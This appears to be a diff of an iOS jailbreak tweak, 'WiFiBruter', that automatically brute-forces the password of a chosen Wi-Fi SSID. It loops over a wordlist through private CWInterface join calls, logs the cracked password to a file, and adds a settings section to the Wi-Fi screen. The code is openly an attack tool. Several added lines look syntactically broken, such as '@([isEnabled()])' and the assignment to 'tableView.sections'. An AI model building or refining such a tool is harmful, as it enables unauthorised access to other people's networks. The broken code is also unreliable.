@@ -2,19 +2,21 @@
 #import <Foundation/Foundation.h>
 #import <CoreFoundation/CoreFoundation.h>
 
+static NSString *const kPrefsDomain = @"com.kilo.wifibruter";
 static NSString *const kLogPath = @"/var/mobile/Documents/wifibruter_log.txt";
 static NSTimeInterval kMinDelay = 0.5;
 
 static void logMessage(NSString *msg);
-static NSDictionary *loadConfig(id self);
-static NSArray *loadPasswords(id self);
-static BOOL isEnabled(id self);
-static NSString *targetSSID(id self);
-static NSTimeInterval getDelay(id self);
-static BOOL joinWithNetwork(id self, id network, NSString *password, NSError **outError);
-static NSArray *scanForTarget(id self, NSString *ssid, NSError **outError);
-static void runBruteForce(id self);
-static void reportSuccess(id self, NSString *ssid, NSString *password);
+static NSDictionary *loadConfig(void);
+static NSArray *loadPasswords(void);
+static BOOL isEnabled(void);
+static NSString *targetSSID(void);
+static NSTimeInterval getDelay(void);
+static void saveConfig(NSDictionary *config);
+static BOOL joinWithNetwork(id network, NSString *password, NSError **outError);
+static NSArray *scanForTarget(NSString *ssid, NSError **outError);
+static void runBruteForce(void);
+static void reportSuccess(NSString *ssid, NSString *password);
 
 static void logMessage(NSString *msg) {
     NSData *data = [msg dataUsingEncoding:NSUTF8StringEncoding];
@@ -26,15 +28,20 @@ static void logMessage(NSString *msg) {
     }
 }
 
-static NSDictionary *loadConfig(id self) {
+static NSDictionary *loadConfig(void) {
     NSString *plistPath = @"/var/mobile/Library/Preferences/dungx.wifibruter.plist";
     NSDictionary *config = [NSDictionary dictionaryWithContentsOfFile:plistPath];
     if (!config) config = @{};
     return [config copy];
 }
 
-static NSArray *loadPasswords(id self) {
-    NSDictionary *config = loadConfig(self);
+static void saveConfig(NSDictionary *config) {
+    NSString *plistPath = @"/var/mobile/Library/Preferences/dungx.wifibruter.plist";
+    [config writeToFile:plistPath atomically:YES];
+}
+
+static NSArray *loadPasswords(void) {
+    NSDictionary *config = loadConfig();
     NSString *path = [config objectForKey:@"WordListPath"];
     if (!path || path.length == 0) path = @"/var/mobile/Documents/wordlist.txt";
     NSString *wordlist = [NSString stringWithContentsOfFile:path encoding:NSUTF8StringEncoding error:nil];
@@ -51,26 +58,26 @@ static NSArray *loadPasswords(id self) {
     return [passwords copy];
 }
 
-static BOOL isEnabled(id self) {
-    NSDictionary *config = loadConfig(self);
+static BOOL isEnabled(void) {
+    NSDictionary *config = loadConfig();
     NSNumber *enabled = [config objectForKey:@"Enabled"];
     return [enabled boolValue];
 }
 
-static NSString *targetSSID(id self) {
-    NSDictionary *config = loadConfig(self);
+static NSString *targetSSID(void) {
+    NSDictionary *config = loadConfig();
     return [config objectForKey:@"TargetSSID"] ?: @"";
 }
 
-static NSTimeInterval getDelay(id self) {
-    NSDictionary *config = loadConfig(self);
+static NSTimeInterval getDelay(void) {
+    NSDictionary *config = loadConfig();
     NSNumber *d = [config objectForKey:@"DelayBetweenAttempts"];
     NSTimeInterval delay = [d doubleValue];
     if (delay < kMinDelay) delay = kMinDelay;
     return delay;
 }
 
-static BOOL joinWithNetwork(id self, id network, NSString *password, NSError **outError) {
+static BOOL joinWithNetwork(id network, NSString *password, NSError **outError) {
     Class cwCls = NSClassFromString(@"CWInterface");
     if (!cwCls) return NO;
     id iface = [cwCls performSelector:@selector(sharedInterface)];
@@ -101,7 +108,7 @@ static BOOL joinWithNetwork(id self, id network, NSString *password, NSError **o
     return ok;
 }
 
-static NSArray *scanForTarget(id self, NSString *ssid, NSError **outError) {
+static NSArray *scanForTarget(NSString *ssid, NSError **outError) {
     Class cwCls = NSClassFromString(@"CWInterface");
     if (!cwCls) return nil;
     id iface = [cwCls performSelector:@selector(sharedInterface)];
@@ -148,13 +155,13 @@ static NSArray *scanForTarget(id self, NSString *ssid, NSError **outError) {
     return result;
 }
 
-static void runBruteForce(id self) {
-    if (!isEnabled(self)) return;
-    NSString *target = targetSSID(self);
+static void runBruteForce(void) {
+    if (!isEnabled()) return;
+    NSString *target = targetSSID();
     if (target.length == 0) return;
-    NSArray *passwords = loadPasswords(self);
+    NSArray *passwords = loadPasswords();
     if (passwords.count == 0) return;
-    NSTimeInterval delay = getDelay(self);
+    NSTimeInterval delay = getDelay();
 
     Class cwCls = NSClassFromString(@"CWInterface");
     if (!cwCls) {
@@ -163,7 +170,7 @@ static void runBruteForce(id self) {
     }
 
     NSError *scanError = nil;
-    NSArray *networks = scanForTarget(self, target, &scanError);
+    NSArray *networks = scanForTarget(target, &scanError);
     if (!networks || networks.count == 0) {
         logMessage([NSString stringWithFormat:@"WiFiBruter: no networks found for SSID %@", target]);
         return;
@@ -173,9 +180,9 @@ static void runBruteForce(id self) {
     for (id network in networks) {
         for (NSString *password in passwords) {
             NSError *joinError = nil;
-            BOOL ok = joinWithNetwork(self, network, password, &joinError);
+            BOOL ok = joinWithNetwork(network, password, &joinError);
             if (ok) {
-                reportSuccess(self, target, password);
+                reportSuccess(target, password);
                 return;
             }
             if (joinError) {
@@ -187,7 +194,7 @@ static void runBruteForce(id self) {
     logMessage(@"WiFiBruter: exhausted wordlist without success");
 }
 
-static void reportSuccess(id self, NSString *ssid, NSString *password) {
+static void reportSuccess(NSString *ssid, NSString *password) {
     NSString *message = [NSString stringWithFormat:@"WiFiBruter: cracked %@ -> %@", ssid, password];
     NSString *logPath = @"/var/mobile/Documents/wifibruter_result.txt";
     [message writeToFile:logPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
@@ -202,7 +209,59 @@ static void reportSuccess(id self, NSString *ssid, NSString *password) {
 - (void)applicationDidFinishLaunching:(id)application {
     %orig;
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
-        runBruteForce(self);
+        runBruteForce();
     });
+}
+%end
+
+%hook WiFiSettingsViewController
+- (void)viewDidLoad {
+    %orig;
+    
+    NSMutableArray *sections = [NSMutableArray arrayWithArray:self.tableView.sections ?: @[]];
+    
+    // Add WiFi Bruter section
+    NSMutableDictionary *wifiBruterSection = [NSMutableDictionary dictionary];
+    [wifiBruterSection setObject:@"WiFi Bruter" forKey:@"title"];
+    
+    NSMutableArray *rows = [NSMutableArray array];
+    
+    // Enabled toggle
+    NSMutableDictionary *enabledRow = [NSMutableDictionary dictionary];
+    [enabledRow setObject:@"Enabled" forKey:@"title"];
+    [enabledRow setObject:@"switch" forKey:@"cell"];
+    [enabledRow setObject:@"Enabled" forKey:@"key"];
+    [enabledRow setObject:@([isEnabled()]) forKey:@"default"];
+    [rows addObject:enabledRow];
+    
+    // Target SSID
+    NSMutableDictionary *ssidRow = [NSMutableDictionary dictionary];
+    [ssidRow setObject:@"Target SSID" forKey:@"title"];
+    [ssidRow setObject:@"textfield" forKey:@"cell"];
+    [ssidRow setObject:@"TargetSSID" forKey:@"key"];
+    [ssidRow setObject:[targetSSID()] forKey:@"default"];
+    [rows addObject:ssidRow];
+    
+    // Wordlist Path
+    NSMutableDictionary *wordlistRow = [NSMutableDictionary dictionary];
+    [wordlistRow setObject:@"Wordlist Path" forKey:@"title"];
+    [wordlistRow setObject:@"textfield" forKey:@"cell"];
+    [wordlistRow setObject:@"WordListPath" forKey:@"key"];
+    [wordlistRow setObject:@"/var/mobile/Documents/wordlist.txt" forKey:@"default"];
+    [rows addObject:wordlistRow];
+    
+    // Delay
+    NSMutableDictionary *delayRow = [NSMutableDictionary dictionary];
+    [delayRow setObject:@"Delay (seconds)" forKey:@"title"];
+    [delayRow setObject:@"textfield" forKey:@"cell"];
+    [delayRow setObject:@"DelayBetweenAttempts" forKey:@"key"];
+    [delayRow setObject:@"1.0" forKey:@"default"];
+    [delayRow setObject:@"numbers" forKey:@"keyboard"];
+    [rows addObject:delayRow];
+    
+    [wifiBruterSection setObject:rows forKey:@"rows"];
+    [sections addObject:wifiBruterSection];
+    
+    self.tableView.sections = sections;
 }
 %end
